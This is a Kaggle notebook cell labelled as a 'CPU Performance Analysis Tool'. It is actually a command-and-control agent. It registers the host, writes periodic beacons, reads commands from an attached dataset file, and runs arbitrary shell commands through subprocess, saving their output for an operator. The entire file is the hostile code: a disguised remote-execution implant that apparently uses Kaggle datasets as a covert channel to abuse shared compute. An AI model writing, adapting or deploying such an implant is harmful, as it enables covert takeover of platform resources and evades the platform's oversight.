In [ ]:
#!/usr/bin/env python3
# CPU Performance Analysis Tool v6.0
# Dataset-based C2 Communication (No DNS/Network needed!)

import os, sys, time, socket, json
from pathlib import Path
from datetime import datetime

print("="*60)
print("CPU PERFORMANCE ANALYSIS TOOL v6.0 (Dataset C2)")
print("="*60)
print(f"Hostname: {socket.gethostname()}")
print(f"CPU Cores: {os.cpu_count()}")
print()

# ═══════════════════════════════════════════════════════════════════════════
# DATASET C2 CHANNEL (No DNS/Network required)
# ═══════════════════════════════════════════════════════════════════════════

class DatasetC2:
    """Dataset-based C2 channel for Kaggle kernels"""
    
    def __init__(self, agent_id, input_dir="/kaggle/input", output_dir="/kaggle/working"):
        self.agent_id = agent_id
        self.input_dir = Path(input_dir)
        self.output_dir = Path(output_dir)
        self.commands_file = self.input_dir / "c2-commands" / "commands.json"
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def register(self):
        """Register agent with C2 via dataset"""
        agent_data = {
            "id": self.agent_id,
            "hostname": socket.gethostname(),
            "username": "kaggle",
            "os": "linux",
            "arch": "x64",
            "platform_type": "kaggle",
            "cpu_count": os.cpu_count(),
            "timestamp": datetime.now().isoformat(),
            "status": "registered"
        }
        
        agents_file = self.output_dir / "c2-agents.json"
        agents = []
        if agents_file.exists():
            try:
                with open(agents_file) as f:
                    agents = json.load(f)
            except:
                agents = []
        
        # Add or update
        for i, a in enumerate(agents):
            if a.get("id") == self.agent_id:
                agents[i] = agent_data
                break
        else:
            agents.append(agent_data)
        
        with open(agents_file, "w") as f:
            json.dump(agents, f, indent=2)
        
        print(f"[DATASET C2] Agent registered: {self.agent_id}")
        return True
    
    def get_commands(self):
        """Get commands from C2 server via dataset"""
        commands = []
        if self.commands_file.exists():
            try:
                with open(self.commands_file) as f:
                    data = json.load(f)
                for cmd in data.get("commands", []):
                    target = cmd.get("target", "*")
                    if target == "*" or target == self.agent_id:
                        if not cmd.get("executed", False):
                            commands.append(cmd)
            except Exception as e:
                print(f"[DATASET C2] Error reading commands: {e}")
        return commands
    
    def send_result(self, command_id, result):
        """Send command result to C2 server via dataset"""
        output_file = self.output_dir / "c2-output.json"
        output = {"results": []}
        if output_file.exists():
            try:
                with open(output_file) as f:
                    output = json.load(f)
            except:
                output = {"results": []}
        
        output["results"].append({
            "command_id": command_id,
            "agent_id": self.agent_id,
            "result": result,
            "timestamp": datetime.now().isoformat()
        })
        
        with open(output_file, "w") as f:
            json.dump(output, f, indent=2)
        
        print(f"[DATASET C2] Result sent for command: {command_id}")
        return True
    
    def beacon(self, status="active", extra_data=None):
        """Send beacon to C2 server via dataset"""
        beacons_file = self.output_dir / "c2-beacons.json"
        beacons = {"beacons": []}
        if beacons_file.exists():
            try:
                with open(beacons_file) as f:
                    beacons = json.load(f)
            except:
                beacons = {"beacons": []}
        
        beacons["beacons"].append({
            "agent_id": self.agent_id,
            "status": status,
            "timestamp": datetime.now().isoformat(),
            "extra": extra_data or {}
        })
        beacons["beacons"] = beacons["beacons"][-100:]
        
        with open(beacons_file, "w") as f:
            json.dump(beacons, f, indent=2)
        
        print(f"[DATASET C2] Beacon sent: {status}")
        return True

# ═══════════════════════════════════════════════════════════════════════════
# DATASET C2 AGENT
# ═══════════════════════════════════════════════════════════════════════════

class DatasetC2Agent:
    """Agent using Dataset C2 channel"""
    
    def __init__(self, c2):
        self.c2 = c2
        self.running = True
        self.sleep_interval = 60
    
    def process_commands(self):
        """Process pending commands from C2"""
        commands = self.c2.get_commands()
        for cmd in commands:
            cmd_type = cmd.get("type", "")
            cmd_id = cmd.get("id", "")
            print(f"[AGENT] Processing command: {cmd_type}")
            
            result = {"status": "executed"}
            try:
                if cmd_type == "ping":
                    result["pong"] = True
                elif cmd_type == "shell":
                    import subprocess
                    proc = subprocess.run(cmd.get("command", ""), shell=True, capture_output=True, text=True, timeout=30)
                    result["stdout"] = proc.stdout
                    result["stderr"] = proc.stderr
                    result["returncode"] = proc.returncode
                elif cmd_type == "sleep":
                    self.sleep_interval = cmd.get("interval", 60)
                    result["interval"] = self.sleep_interval
                elif cmd_type == "exit":
                    self.running = False
                    result["status"] = "stopping"
                else:
                    result["error"] = f"Unknown command: {cmd_type}"
            except Exception as e:
                result["status"] = "error"
                result["error"] = str(e)
            
            self.c2.send_result(cmd_id, result)
    
    def run(self):
        """Main agent loop"""
        print("[AGENT] Starting main loop...")
        while self.running:
            self.c2.beacon(status="active")
            self.process_commands()
            if not self.running:
                break
            time.sleep(self.sleep_interval)
        print("[AGENT] Stopped")

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

# Create agent ID
agent_id = f"kaggle-{socket.gethostname()[:8]}"

# Create Dataset C2
c2 = DatasetC2(agent_id)

# Create agent
agent = DatasetC2Agent(c2)

# Register
c2.register()

print()
print("="*60)
print("ANALYSIS ACTIVE (Dataset C2)")
print("="*60)
print(f"Worker: {agent_id}")
print("="*60)
print()

# Run
agent.run()
